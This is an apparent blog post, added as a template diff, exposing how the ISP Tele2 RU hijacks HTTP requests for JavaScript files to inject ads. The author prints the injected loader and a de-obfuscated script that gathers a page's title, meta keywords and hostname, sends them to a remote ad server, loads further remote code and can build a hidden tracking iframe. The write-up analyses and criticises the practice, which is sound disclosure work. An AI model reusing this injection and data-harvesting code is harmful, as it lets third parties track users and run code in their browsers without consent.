@@ -1,0 +1,154 @@
+[% PROCESS macros.tt2 %]
+[% global.title = 'Tele2 RU hijacks HTTP connections' %]
+
+In other news, water is wet, sky has a bluish colour, and 2 + 2 = 4.
+
+I deployed an HTTP website[1] and wanted to check whether it works. One of the first things I noticed was that it loaded third-party JavaScript from a domain name that looked like an ad network:
+
+!(center)umatrix.png!
+
+Third-party JavaScript ads? On _my_ website? Inconceivable! I must investigate this at once!
+
+I'll skip a few false starts; it took me a while to notice that while the original HTML code of the page has arrived intact, the @ui.js@ file containing the code for the interactive part of the page was sometimes downloaded twice per page load:
+
+!(center)requests.png!
+!(center)requests2.png!
+
+And this 725-byte file that arrived without a header indentifying my Web server, prohibited caching and also had @Connection: close@? That's definitely not mine. It doesn't happen all the time; if I request the same URL repeatedly, I eventually start getting the original content, but every once in a while a new @HTTP GET@ request for a path ending in @.js@ is hijacked to return something completely different instead:
+
+[% WRAPPER code, lang='txt' %]
+$ curl -s http://example.org/whatever.js | zcat | python3 -c 'import jsbeautifier; jsbeautifier.main()' -
+! function() {
+    function t() {
+        try {
+            return window.self !== window.top
+        } catch (t) {
+            return !0
+        }
+    }
+
+    function e() {
+        var t = document.getElementsByTagName("head")[0],
+            e = document.createElement("script");
+        e.src = "http://p.tlrtb.com/ad/base.js?", e.type = "text/javascript", t.appendChild(e)
+    }
+
+    function n(t) {
+        o.parentNode.insertBefore(t, o.nextSibling)
+    }
+
+    function r(t) {
+        document.write(t.outerHTML)
+    }
+
+    function c() {
+        for (var t = document.createElement("script"), e = Array.prototype.slice.call(o.attributes), n = 0; n < e.length; n++) t.setAttribute(e[n].nodeName, e[n].nodeValue);
+        return t.src = "http://example.org/whatever.js?", t
+    }
+    var o = document.currentScript || document.scripts[document.scripts.length - 1],
+        i = c();
+    o.async || o.defer ? n(i) : r(i), window.__qsrad || t() || (window.__qsrad = 1, e())
+}();
+$ torify curl -sI http://example.org/whatever.js | head -n 1
+HTTP/1.1 404 Not Found
+[% END %]
+
+Note that the original @.js@ is transparently fetched by appending a @?@ to the URL. I'm tempted to add an @?@ to all script URLs on my own website, just out of spite. Also note that a random Tor exit node (that's usually interested in conducting all sorts of shenanigans on plain-text traffic passing through it) returns the original content of the URL, while my own ISP (that's supposed to be interested in passing the traffic unaffected because I'm paying them money) does not!
+
+What does this @http://p.tlrtb.com/ad/base.js@ do that Tele2RU wants to inject into my pages so much? After some manual de-obfuscation, here's what I ended up with:
+
+[% WRAPPER code, lang='js' %]
+(function() {
+    function get_keywords() {
+        var metas = [
+            "keywords",
+            "description"
+        ];
+        var keywords = [];
+
+        function words(str) {
+            return str.replace(/[^a-zA-Z0-9а-яА-Я-ёЁ ]+/g, '\x20').replace(/\s\s+/g, '\x20').replace(" - ", '\x20').trim().split('\x20');
+        }
+        if (document.title) {
+            keywords = keywords.concat(words(document.title));
+        }
+        var meta_tags = document.getElementsByTagName("meta");
+        for (var i = 0; i < meta_tags.length; i++) {
+            var mtag = meta_tags[i];
+            var mname = mtag.getAttribute("name");
+            if (mname && (metas.indexOf(mname.toLowerCase()) != -1)) {
+                keywords = keywords.concat(words(mtag.getAttribute("content")));
+            }
+        }
+        for (var i = 0; i < keywords["length"]; i++) {
+            if (keywords[i].length > 40) {
+                keywords[i] = keywords[i].substr(0, 40);
+            }
+        }
+        var ret = '';
+        for (var i = 1; i < keywords.length + 1; i++) {
+            var slice = keywords.slice(0, i);
+            var squeezed = slice["join"](',');
+            if (squeezed.length <= 200) {
+                ret = squeezed;
+            }
+        }
+
+        function hostname() {
+            return ",%%" + window.location.hostname.replace(/\./g, '%') + '%%';
+        }
+        return ret.trim() + hostname();
+    }
+
+    function load_script(src) {
+        var script = document.createElement("script");
+        script.src = src;
+        var last_script = document.currentScript || document.scripts[document.scripts.length - 1];
+        last_script.parentNode.insertBefore(script, last_script.nextSibling);
+    }
+
+    function utcoffset() {
+        return -new Date().getTimezoneOffset();
+    }
+
+    function make_iframe(uid) {
+        var div = document.createElement("div");
+        div.innerHTML = "<!--Start of Floodlight Tag: Please do not remove Activity name of this tag: sync_activity URL of the webpage " +
+            "where the tag is expected to be placed: This tag must be placed between the <body> and </body> tags, as close as possible " +
+            "to the opening tag. Creation Date: 04/22/2020--><script type=\"text/javascript\">var axel = Math.random() + \"\";var a = " +
+            "axel * 10000000000000;document.write(" + '<iframe\x20src=\x22https://10028645.fls.doubleclick.net/activityi;src=10028645;' +
+            'type=syncd0;cat=sync_0;u1=' + uid + ";dc_lat=;dc_rdid=;tag_for_child_directed_treatment=;tfua=;npa=;ord=" + " + a + " +
+            "?\" width=\"1\" height=\"1\" frameborder=\"0\" style=\"display:none\"></iframe>" + ");</script><noscript><iframe src=\"" +
+            "https://10028645.fls.doubleclick.net/activityi;src=10028645;type=syncd0;cat=sync_0;u1=\"" + uid + "\";dc_lat=;dc_rdid=;" +
+            "tag_for_child_directed_treatment=;tfua=;npa=;ord=1?\" width=\"1\" height=\"1\" frameborder=\"0\" style=\"display:none\"" +
+            "></iframe></noscript><!-- End of Floodlight Tag: Please do not remove -->";
+        document.body.append(div);
+    }
+    var p = '';
+    var datasync = false;
+    var uid = 'aIMxoXBLDRyEzMqIjfKa0Q==';
+    if (datasync) {
+        make_iframe(uid);
+    }
+    var adbase_url = "http://p.tlrtb.com/ad/base.js?" + (p ? p + '&' : '') + "kw=" + encodeURIComponent(get_keywords()) + "&utcoffset=" + utcoffset();
+    load_script(adbase_url);
+}());
+[% END %]
+
+Yeah, it takes the hostname of the page you are viewing, the keywords from the title and @<meta>@ tags describing the page for the search engines and sends it off to the same remote server, expecting more JavaScript to load and execute. What does it do then? I tried feeding some data to that address, but only got @HTTP 502 Bad Gateway@ in reply. Perhaps it only returns non-errors on certain keywords it considers especially interesting. Who knows?
+
+Speaking of errors,
+
+[% WRAPPER code, lang='txt' %]
+$ curl -I http://example.org/does_not_exist
+HTTP/1.1 301 Moved Permanently
+Location: http://404.services/404/
+$ torify curl -sI http://example.org/does_not_exist | head -n 1
+HTTP/1.1 404 Not Found
+[% END %]
+
+Yes, everybody likes it when they get a page with more ads instead of an honest 404! Not.
+
+Unfortunately, this shameful practice is now considered the norm by mobile ISPs and can only be expected to get worse. Make sure you always have an ad-blocker installed; block unknown third-party resources by default; and yes, use HTTPS. This prevents almost everyone from spying on you... except the page owners themselves and the CDN (something something cloudflare something MITM). But that's another story.
+
+fn1. Yes, the WWW should be all encrypted (or at least signed), and everyone should beware J. Random Script Kiddie, Jr. with a Wi-Fi pentester toolkit. That's not the point. There are no Wi-Fi attacks in this story.
